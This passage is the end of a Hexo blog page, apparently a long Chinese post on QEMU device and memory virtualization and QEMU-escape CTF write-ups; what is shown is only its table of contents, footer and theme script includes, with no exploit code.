href="#%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%8C%96"><span class="nav-text">内存虚拟化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%B1%BB%E5%88%AB"><span class="nav-text">内存地址类别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-text">内存结构初始化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2"><span class="nav-text">内存地址转换</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E8%AE%BE%E8%99%9A%E6%8B%9F%E5%8C%96"><span class="nav-text">外设虚拟化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E6%96%AD%E8%99%9A%E6%8B%9F%E5%8C%96"><span class="nav-text">中断虚拟化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E6%96%AD%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="nav-text">中断控制器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E6%96%AD%E7%B1%BB%E5%9E%8B"><span class="nav-text">中断类型</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PCI-%E8%AE%BE%E5%A4%87"><span class="nav-text">PCI 设备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BDF-DBDF-%E7%BC%96%E5%9D%80"><span class="nav-text">BDF&#x2F;DBDF 编址</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BDF-DBDF-%E7%BC%96%E5%9D%80%E6%A0%BC%E5%BC%8F"><span class="nav-text">BDF&#x2F;DBDF 编址格式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BDF-%E4%B8%8E%E6%9C%BA%E5%99%A8%E6%8B%93%E6%89%91"><span class="nav-text">BDF 与机器拓扑</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DBDF-%E5%88%B0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AF%B9%E5%BA%94"><span class="nav-text">DBDF 到文件系统的对应</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BDF-%E4%B8%8E%E9%85%8D%E7%BD%AE%E7%A9%BA%E9%97%B4%E8%AE%BF%E9%97%AE"><span class="nav-text">BDF 与配置空间访问</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E7%A9%BA%E9%97%B4"><span class="nav-text">配置空间</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E7%A9%BA%E9%97%B4%E7%BB%93%E6%9E%84"><span class="nav-text">配置空间结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E7%A9%BA%E9%97%B4%E6%9F%A5%E7%9C%8B"><span class="nav-text">配置空间查看</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BAR-%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-text">BAR 寄存器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BAR-%E5%AF%84%E5%AD%98%E5%99%A8%E7%BB%93%E6%9E%84"><span class="nav-text">BAR 寄存器结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B-BAR-%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-text">查看 BAR 寄存器</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F"><span class="nav-text">通信方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PIO%EF%BC%88Port-I-O%EF%BC%8C%E7%AB%AF%E5%8F%A3-I-O%EF%BC%89"><span class="nav-text">PIO（Port-I&#x2F;O，端口 I&#x2F;O）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MMIO%EF%BC%88Memory-Mapped-I-O%EF%BC%8C%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84-I-O%EF%BC%89"><span class="nav-text">MMIO（Memory-Mapped I&#x2F;O，内存映射 I&#x2F;O）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-text">数据结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E9%87%8A%E6%94%BE"><span class="nav-text">初始化与释放</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#int-mmio-init-const-char-bdf-or-path-int-bar-idx"><span class="nav-text">int mmio_init(const char *bdf_or_path, int bar_idx);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#void-mmio-fini-void"><span class="nav-text">void mmio_fini(void);</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%8E%A5%E5%8F%A3"><span class="nav-text">查询接口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E6%8D%A2%E7%AE%97"><span class="nav-text">地址换算</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#uint64-t-mmio-offset-to-phys-size-t-off"><span class="nav-text">uint64_t mmio_offset_to_phys(size_t off);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#uint64-t-mmio-virt-to-phys-const-void-p"><span class="nav-text">uint64_t mmio_virt_to_phys(const void *p);</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E8%AE%BF%E9%97%AE"><span class="nav-text">寄存器访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E5%80%BC%E4%B8%8E%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86"><span class="nav-text">返回值与错误处理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU-Object-Model"><span class="nav-text">QEMU Object Model</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%B3%A8%E5%86%8C"><span class="nav-text">类型的注册</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-text">类型的初始化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84"><span class="nav-text">类型的层次结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-text">对象的构造与初始化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#QOM-%E4%B8%AD%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="nav-text">QOM 中的属性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU-%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%8C%96"><span class="nav-text">QEMU 内存虚拟化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#QEMU-%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84"><span class="nav-text">QEMU 内存结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-%E5%9E%8B%E5%86%85%E5%AD%98%E6%B3%A8%E5%86%8C"><span class="nav-text">IO 型内存注册</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#memory-region-init-io"><span class="nav-text">memory_region_init_io</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pci-register-bar"><span class="nav-text">pci_register_bar</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-%E5%9E%8B%E5%86%85%E5%AD%98%E8%AF%BB%E5%86%99"><span class="nav-text">IO 型内存读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="nav-text">内存操作函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#AddressSpace-%E9%80%9A%E7%94%A8%E8%AF%BB%E5%86%99"><span class="nav-text">AddressSpace 通用读写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dma-memory-read-dma-memory-write%EF%BC%88%E8%AE%BE%E5%A4%87%E5%8F%91%E8%B5%B7-DMA-%E6%97%B6%E4%BC%98%E5%85%88%E7%94%A8%EF%BC%89"><span class="nav-text">dma_memory_read &#x2F; dma_memory_write（设备发起 DMA 时优先用）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PCI-%E4%B8%93%E7%94%A8%EF%BC%9Apci-dma-read-pci-dma-write"><span class="nav-text">PCI 专用：pci_dma_read &#x2F; pci_dma_write</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cpu-physical-memory"><span class="nav-text">cpu_physical_memory_*</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2-1"><span class="nav-text">内存地址转换</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU-%E8%AE%BE%E5%A4%87%E5%88%86%E6%9E%90"><span class="nav-text">QEMU 设备分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PCI-%E8%AE%BE%E5%A4%87-1"><span class="nav-text">PCI 设备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E5%AE%9E%E4%BE%8B%E5%AE%9A%E4%B9%89"><span class="nav-text">设备实例定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E7%B1%BB%E5%9E%8B%E5%AE%9A%E4%B9%89"><span class="nav-text">设备类型定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E5%88%9D%E5%A7%8B%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="nav-text">设备初始化操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMUTimer"><span class="nav-text">QEMUTimer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#QEMUTimer-%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84"><span class="nav-text">QEMUTimer 相关结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#QEMUTimer-%E4%BD%BF%E7%94%A8"><span class="nav-text">QEMUTimer 使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#QEMUTimerList-%E5%9B%9E%E8%B0%83"><span class="nav-text">QEMUTimerList 回调</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#QEMUTimer-%E5%9B%9E%E8%B0%83"><span class="nav-text">QEMUTimer 回调</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HXB2019-pwn2"><span class="nav-text">HXB2019-pwn2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-Exp"><span class="nav-text">完整 Exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RWCTF2021-Easy-escape"><span class="nav-text">RWCTF2021 Easy_escape</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-Exp-1"><span class="nav-text">完整 Exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GACTF2020-babyqemu"><span class="nav-text">GACTF2020 babyqemu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-Exp-2"><span class="nav-text">完整 Exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HWS2021-FastCP"><span class="nav-text">HWS2021 FastCP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-3"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-Exp-3"><span class="nav-text">完整 Exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#D-3CTF2021-d3dev"><span class="nav-text">D^3CTF2021 d3dev</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-Exp-4"><span class="nav-text">完整 Exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%8E%E4%B8%BA%E4%BA%912020-qemuzzz"><span class="nav-text">华为云2020 qemuzzz</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2021qwb-EzQtest"><span class="nav-text">2021qwb-EzQtest</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-4"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-4"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-Exp-5"><span class="nav-text">完整 Exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2025qwb-babybus"><span class="nav-text">2025qwb-babybus</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-5"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E8%AF%91-QEMU"><span class="nav-text">编译 QEMU</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-text">调试环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03%EF%BC%9A%E8%B6%8A%E7%95%8C%E8%AF%BB"><span class="nav-text">0x03：越界读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03%EF%BC%9A%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="nav-text">0x03：堆溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x10%EF%BC%9A%E8%B6%8A%E7%95%8C%E5%86%99"><span class="nav-text">0x10：越界写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-5"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-text">劫持程序执行流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">任意代码执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-Exp-6"><span class="nav-text">完整 Exp</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        57 posts in total
                    </span>
                    
                        <span>
                            1173.8k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>